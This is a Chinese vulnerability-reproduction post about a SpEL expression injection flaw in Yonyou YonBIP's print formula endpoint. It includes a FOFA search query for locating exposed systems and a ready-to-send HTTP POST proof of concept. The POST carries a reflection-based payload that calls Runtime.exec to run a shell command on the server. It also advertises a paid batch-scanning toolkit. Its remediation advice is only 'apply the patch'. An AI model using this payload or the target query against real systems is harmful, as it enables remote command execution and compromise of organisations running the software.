#  用友YonBIP execute SpEL存在表达式注入漏洞  附POC  
2026-10-22更新
                    2026-10-22更新  南风漏洞复现文库   2026-10-21 16:18  
  
   
  
#   
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 用友YonBIP简介  
  
微信公众号搜索：南风漏洞复现文库  
该文章 南风漏洞复现文库 公众号首发  
  
用友YonBIP  
## 2.漏洞描述  
  
用友YonBIP execute SpEL存在表达式注入漏洞  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
用友YonBIP  
![用友YonBIP execute SpEL存在表达式注入漏洞](https://mmbiz.qpic.cn/mmbiz_png/b9KQYsB8q6xeCrWrduY82dacLzVyzCaPknozic32sCudkdEibOr0w0pVoHMNvUrvq7l3wvbXVJpLhtkGINLgGxy9VJNIfKE9tdABKMHxjJ364/640?wx_fmt=png&from=appmsg "")  
  
用友YonBIP execute SpEL存在表达式注入漏洞  
## 4.fofa查询语句  
  
app="用友-YonBIP"  
## 5.漏洞复现  
  
漏洞链接：https://xx.xx.xx.xx/iuap-apcom-print/iuap-print/rest/formula/execute  
  
漏洞数据包：  
```
POST /iuap-apcom-print/iuap-print/rest/formula/execute HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT6.1;MHhzZWNs) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.617.73 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: xx.xx.xx.xx
Content-Type: application/json
Cookie: _WorkbenchCross_=Ultraman
Content-Length: 622

{
  "formulaExpression": "1L.getClass().getClass().getMethod('forName', 'a'.getClass()).invoke(null, 'java.util.Scanner').getConstructor(1L.getClass().getClass().getMethod('forName', 'a'.getClass()).invoke(null, 'java.io.InputStream')).newInstance(1L.getClass().getClass().getMethod('forName', 'a'.getClass()).invoke(null, 'java.lang.Runtime').getMethod('getRuntime').invoke(null).getClass().getMethod('exec', 'a'.getClass()).invoke(1L.getClass().getClass().getMethod('forName', 'a'.getClass()).invoke(null, 'java.lang.Runtime').getMethod('getRuntime').invoke(null), 'id').getInputStream()).useDelimiter('\\\\A').next()"
}
```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/b9KQYsB8q6xrIhTxQkC1wuhxl0aghZoTmI6gfVgowicIRia4vkRGzZJceGdCvwlBhMURNXEA54Z2GdsZxNZ0JWx3eUYMty5WnD4cjREkuQJsE/640?wx_fmt=jpeg&from=appmsg "")  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全  
1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。  
2: 免登录，免费fofa查询。   
3: 更新其他实用网络安全工具项目。  
4: 免费指纹识别，持续更新指纹库。  
5: Nuclei脚本。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/b9KQYsB8q6wFWicS1NLxFmhPMI0EeXEcc37GWlrEZYsViasHYAKoLTVPBMMibibbyEYTlEibz9Rs45K8iav2GqAYEiawf3XynL19eFbGQap3smUC7Y/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/b9KQYsB8q6z9Y5zcy9W1JymO8KJFBrYfROFbhZFIMdS3qGZDr9WYq7q9Sf6nXT0FZM6LPRLibxedVSwP8YwNbDdJXdZhv0AWZm5KD5NJYwKs/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/b9KQYsB8q6zGVAibm2yZYmno4bT1ZLsgr6jEz9g5HNPRfbOb9kPBa4iasuP7cib8KGkVekX32WhIXRmD5H1VZzTVf0LpS0oQbNkC5mR1F7097k/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/b9KQYsB8q6wF8Sau8OfXzJzPlHw2EICXickS817GXSqegj2TS4BMDK2VMHTS8djg7oFCQ1TlspRGU67OHGJBj53U2FA8ykZaOwcCwP36g5QM/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b9KQYsB8q6zElw7v5XJoUKqFoGfAVJ0mkZY51dtuz9yOfldnib2DOibdYbGv78vCJ4kfFPWn8PzQrdxh4HtJRJMc9hnq0iculwibKlP2V8XcRP8/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/b9KQYsB8q6w2KobhsYpbND8K4DhWybCojZoaYaEdPbUd2SibmBnPmdOIfB77BMdiaw6ibLAibweb4dQiclc4lEws0E7H4psTK19Ymt0De7Biaj7qg/640?wx_fmt=jpeg&from=appmsg "")  
## 7.整改意见  
  
打补丁  
## 8.往期回顾  
  
  
   
  
  
  
